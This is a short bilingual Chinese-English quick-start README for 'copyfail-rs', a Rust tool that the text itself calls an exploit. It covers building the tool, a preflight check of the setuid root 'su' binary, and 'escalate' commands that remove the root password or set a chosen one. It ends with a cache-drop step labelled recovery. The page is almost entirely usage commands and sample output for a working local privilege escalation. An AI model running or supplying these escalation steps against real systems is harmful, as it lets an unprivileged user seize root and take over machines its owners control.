# 快速开始 / Quick Start

## 构建 / Build

```bash
# 调试构建 / Debug build
cargo build

# 发布构建（静态链接） / Release build (static)
cargo build --release

# 运行测试 / Run tests
cargo test
```

## 安全预检 / Preflight Check

在尝试任何利用之前，先用 `--check` 检查目标环境：

Before attempting any exploit, use `--check` to inspect the target:

```bash
./copyfail-rs --check
```

输出示例 / Example output：

```text
Safe preflight/check mode: no overwrite or exec attempted.
Resolved su path: /usr/bin/su
Path type: regular file
Metadata mode: 4755
setuid bit: yes
uid: 0 gid: 0
size: 55680 bytes
read-only open as current user: yes
```

## 提权 / Escalate

```bash
# 移除 root 密码 / Remove root password
./copyfail-rs --escalate

# 设置 root 密码 / Set root password
printf '%s\n' 'mypassword' | ./copyfail-rs --set-password
```

## 恢复 / Recovery

```bash
echo 3 > /proc/sys/vm/drop_caches
```
